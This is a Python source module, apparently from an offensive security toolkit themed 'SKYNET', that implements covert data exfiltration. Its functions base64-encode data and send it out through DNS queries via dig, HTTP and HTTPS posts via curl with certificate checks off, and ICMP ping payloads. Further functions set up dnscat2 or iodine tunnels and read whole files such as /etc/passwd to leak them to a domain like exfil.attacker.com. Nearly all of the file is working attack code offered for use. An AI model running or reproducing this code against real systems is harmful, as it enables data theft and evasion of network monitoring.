"""
SKYNET Covert Channel Exfiltration Module
==========================================

Implements covert channels for data exfiltration including DNS, HTTP, ICMP.

Primary Users:
- T-800 Infiltrator (Alpha-Red)
- Forensic Analyzer (Alpha-Platinum)
"""

import base64
import os
from typing import Any

from skynet.tools.common import generic_linux_command


def dns_exfiltrate(
    data: str,
    dns_server: str,
    domain: str,
    chunk_size: int = 63,
) -> dict[str, Any]:
    """
    Exfiltrate data via DNS queries.

    Args:
        data: Data to exfiltrate (will be base64 encoded)
        dns_server: DNS server to query
        domain: Domain under attacker control
        chunk_size: Size of each DNS query chunk

    Returns:
        Dictionary with exfiltration result

    Example:
        >>> result = dns_exfiltrate(
        ...     data="sensitive data",
        ...     dns_server="10.10.14.5",
        ...     domain="exfil.attacker.com"
        ... )
    """
    result = {"success": False, "queries_sent": 0, "error": None}

    try:
        # Encode data to base64
        if isinstance(data, str):
            data_bytes = data.encode("utf-8")
        else:
            data_bytes = data

        encoded = base64.b64encode(data_bytes).decode("utf-8")

        # Split into chunks for DNS subdomain labels (max 63 chars)
        chunks = [encoded[i : i + chunk_size] for i in range(0, len(encoded), chunk_size)]

        queries_sent = 0
        for idx, chunk in enumerate(chunks):
            # Create DNS query: chunk.id.domain
            query = f"{chunk}.{idx}.{domain}"

            # Use dig or nslookup
            cmd_result = generic_linux_command("dig", f"@{dns_server} {query}")

            if cmd_result.get("success"):
                queries_sent += 1

        result["success"] = True
        result["queries_sent"] = queries_sent

    except Exception as e:
        result["error"] = str(e)

    return result


def http_exfiltrate(
    data: str,
    target_url: str,
    method: str = "POST",
    use_encoding: bool = True,
) -> dict[str, Any]:
    """
    Exfiltrate data via HTTP.

    Args:
        data: Data to exfiltrate
        target_url: Target HTTP endpoint
        method: HTTP method (POST, GET, PUT)
        use_encoding: Base64 encode data

    Returns:
        Dictionary with exfiltration result

    Example:
        >>> result = http_exfiltrate(
        ...     data="sensitive data",
        ...     target_url="http://10.10.14.5:8000/upload"
        ... )
    """
    result = {"success": False, "status_code": None, "error": None}

    try:
        # Encode if requested
        if use_encoding:
            if isinstance(data, str):
                data = base64.b64encode(data.encode("utf-8")).decode("utf-8")

        # Use curl for HTTP request
        if method.upper() == "POST":
            cmd_result = generic_linux_command("curl", f"-X POST -d 'data={data}' {target_url}")
        elif method.upper() == "GET":
            cmd_result = generic_linux_command("curl", f"{target_url}?data={data}")

        if cmd_result.get("success"):
            result["success"] = True
            result["output"] = cmd_result.get("output", "")
        else:
            result["error"] = cmd_result.get("error", "HTTP exfiltration failed")

    except Exception as e:
        result["error"] = str(e)

    return result


def https_exfiltrate(
    data: str,
    target_url: str,
    method: str = "POST",
    verify_ssl: bool = False,
) -> dict[str, Any]:
    """
    Exfiltrate data via HTTPS.

    Args:
        data: Data to exfiltrate
        target_url: Target HTTPS endpoint
        method: HTTP method
        verify_ssl: Verify SSL certificate

    Returns:
        Dictionary with exfiltration result

    Example:
        >>> result = https_exfiltrate(
        ...     data="sensitive data",
        ...     target_url="https://10.10.14.5:8443/upload",
        ...     verify_ssl=False
        ... )
    """
    result = {"success": False, "error": None}

    try:
        # Encode data
        if isinstance(data, str):
            data = base64.b64encode(data.encode("utf-8")).decode("utf-8")

        # Build curl command
        cmd_parts = ["curl", "-X", method]

        if not verify_ssl:
            cmd_parts.append("-k")

        cmd_parts.extend(["-d", f"'data={data}'", target_url])

        cmd_result = generic_linux_command(cmd_parts[0], " ".join(cmd_parts[1:]))

        if cmd_result.get("success"):
            result["success"] = True
            result["output"] = cmd_result.get("output", "")
        else:
            result["error"] = cmd_result.get("error", "HTTPS exfiltration failed")

    except Exception as e:
        result["error"] = str(e)

    return result


def icmp_exfiltrate(
    data: str,
    target_ip: str,
    chunk_size: int = 32,
) -> dict[str, Any]:
    """
    Exfiltrate data via ICMP echo requests.

    Args:
        data: Data to exfiltrate
        target_ip: Target IP to ping
        chunk_size: Size of each ICMP payload

    Returns:
        Dictionary with exfiltration result

    Example:
        >>> result = icmp_exfiltrate(
        ...     data="sensitive data",
        ...     target_ip="10.10.14.5"
        ... )
    """
    result = {"success": False, "packets_sent": 0, "error": None}

    try:
        # Encode data
        if isinstance(data, str):
            data_bytes = data.encode("utf-8")
        else:
            data_bytes = data

        encoded = base64.b64encode(data_bytes).decode("utf-8")

        # Split into chunks
        chunks = [encoded[i : i + chunk_size] for i in range(0, len(encoded), chunk_size)]

        packets_sent = 0
        for chunk in chunks:
            # Send ICMP with data in payload
            cmd_result = generic_linux_command("ping", f"-c 1 -p {chunk.encode('utf-8').hex()} {target_ip}")

            if cmd_result.get("success"):
                packets_sent += 1

        result["success"] = True
        result["packets_sent"] = packets_sent

    except Exception as e:
        result["error"] = str(e)

    return result


def setup_dns_tunnel(
    dns_server: str,
    domain: str,
    local_port: int = 53,
) -> dict[str, Any]:
    """
    Setup DNS tunnel using dnscat2 or iodine.

    Args:
        dns_server: DNS server address
        domain: Domain under control
        local_port: Local port for tunnel

    Returns:
        Dictionary with tunnel setup result

    Example:
        >>> tunnel = setup_dns_tunnel(
        ...     dns_server="10.10.14.5",
        ...     domain="tunnel.attacker.com"
        ... )
    """
    result = {"success": False, "tunnel_command": "", "error": None}

    try:
        # Try dnscat2 first
        cmd_parts = ["dnscat2", domain]

        result["tunnel_command"] = " ".join(cmd_parts)

        cmd_result = generic_linux_command(cmd_parts[0], " ".join(cmd_parts[1:]) + " &")

        if cmd_result.get("success"):
            result["success"] = True
            result["output"] = "DNS tunnel established"
        else:
            # Try iodine as fallback
            cmd_parts = ["iodine", "-f", dns_server, domain]
            result["tunnel_command"] = " ".join(cmd_parts)

            cmd_result = generic_linux_command(cmd_parts[0], " ".join(cmd_parts[1:]) + " &")

            if cmd_result.get("success"):
                result["success"] = True
                result["output"] = "DNS tunnel established via iodine"
            else:
                result["error"] = "DNS tunnel setup failed"

    except Exception as e:
        result["error"] = str(e)

    return result


def exfiltrate_file_via_dns(
    file_path: str,
    dns_server: str,
    domain: str,
) -> dict[str, Any]:
    """
    Exfiltrate entire file via DNS.

    Args:
        file_path: Path to file to exfiltrate
        dns_server: DNS server
        domain: Domain under control

    Returns:
        Dictionary with exfiltration result

    Example:
        >>> result = exfiltrate_file_via_dns(
        ...     file_path="/etc/passwd",
        ...     dns_server="10.10.14.5",
        ...     domain="exfil.attacker.com"
        ... )
    """
    result = {"success": False, "file_size": 0, "error": None}

    try:
        # Read file
        if not os.path.exists(file_path):
            result["error"] = f"File not found: {file_path}"
            return result

        with open(file_path, "rb") as f:
            file_data = f.read()

        result["file_size"] = len(file_data)

        # Exfiltrate via DNS
        exfil_result = dns_exfiltrate(data=file_data, dns_server=dns_server, domain=domain)

        if exfil_result.get("success"):
            result["success"] = True
            result["queries_sent"] = exfil_result.get("queries_sent", 0)
        else:
            result["error"] = exfil_result.get("error", "DNS exfiltration failed")

    except Exception as e:
        result["error"] = str(e)

    return result
